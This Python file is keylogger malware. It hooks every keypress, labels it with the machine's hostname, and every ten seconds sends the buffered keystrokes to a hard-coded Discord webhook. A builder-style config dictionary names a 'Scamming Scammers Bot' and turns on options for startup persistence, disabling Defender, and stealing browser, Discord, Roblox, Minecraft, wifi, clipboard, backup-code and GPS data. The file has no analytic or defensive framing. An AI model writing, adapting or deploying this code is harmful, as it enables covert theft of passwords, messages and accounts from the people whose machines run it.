import requests
import keyboard
import socket
import time
BUILDERVALUES = {
    "webhook": "https://discord.com/api/webhooks/1203454250001240095/PvZ2U0RhgT_KHRB-TZTv1qcXdwTPYFgvlG8VabGgYahm3OsmkeaKWLj1h7h3g35qK4a8",
    "botname": "Scamming Scammers Bot",
    "ping": True,
    "pingtype": "Everyone",
    "startup": True,
    "defender": True,
    "systeminfo": True,
    "browser": True,
    "roblox": True,
    "obfuscation": True,
    "minecraft": True,
    "wifi": True,
    "discord": True,
    "self_destruct": True,
    "clipboard": True,
    "backupcodes": True,
    "keylogger": "https://discord.com/api/webhooks/1213563735558586440/YL8z-w4AV_A6It1ip4gtQhhNaqU6HtULSVz--SH5D1A8Mgcq8I-jUi7fZDg9p-uYAtHR",
    "icon": "https://cdn.discordapp.com/attachments/1141547949810257921/1204294384552517682/standard.gif?ex=65d4358b&is=65c1c08b&hm=984e3cac303359287b9f1c3c14ff2a1188e32f3973ceed6e890b362e21f4e251&",
    "gps": True,
}

# Get computer's name
computer_name = socket.gethostname()

# Initialize Shift and Caps Lock state
shift_pressed = False
caps_lock_pressed = False

# Buffer to store pressed keys
key_buffer = []

# Set of keys to always capitalize
special_keys = {
    "alt", "ctrl", "shift", "fn", "esc", "home", "end", "insert", "delete", 
    "backspace", "tab", "enter", "caps lock", "num lock", "scroll lock", "right shift", 
    "left shift", "right ctrl", "left ctrl", "right alt", "left alt", "right arrow", 
    "left arrow", "down arrow", "up arrow"
}

# Function to send message to Discord
def send_to_discord(messages):
    for message in messages:
        payload = {'content': message}
        requests.post(BUILDERVALUES["keylogger"], json=payload)

# Function to handle key press
def on_press(event):
    global shift_pressed, caps_lock_pressed
    try:
        key_name = event.name
        
        # Check if it's a special key
        if key_name.lower() in special_keys:
            # Always capitalize special keys
            key_name = key_name.upper()
        else:
            # For non-special keys, check if shift or caps lock is pressed for capitalization
            if (not shift_pressed and not caps_lock_pressed) or (shift_pressed and caps_lock_pressed):
                key_name = key_name.lower()
            else:
                key_name = key_name.upper()

        # Add key to buffer
        key_buffer.append(f"**{computer_name}** - **Key Pressed:** {key_name}")

    except AttributeError:
        pass

# Function to handle shift key being pressed
def on_shift_press(event):
    global shift_pressed
    shift_pressed = True

# Function to handle shift key being released
def on_shift_release(event):
    global shift_pressed
    shift_pressed = False

# Function to handle Caps Lock key being pressed
def on_caps_lock_press(event):
    global caps_lock_pressed
    caps_lock_pressed = not caps_lock_pressed  # Toggle Caps Lock state

# Function to process key buffer and send messages
def process_buffer():
    if key_buffer:
        send_to_discord(key_buffer)
        key_buffer.clear()

# Start listening for key presses
keyboard.on_press(on_press)

# Listen for shift key events
keyboard.on_press_key("shift", on_shift_press)
keyboard.on_release_key("shift", on_shift_release)

# Listen for Caps Lock key events
keyboard.on_press_key("caps lock", on_caps_lock_press)

# Main loop to periodically process the buffer
try:
    while True:
        process_buffer()
        time.sleep(10)  # Adjust the time window as needed
except KeyboardInterrupt:
    pass  # This block is not executed anymore since the try-except block is removed
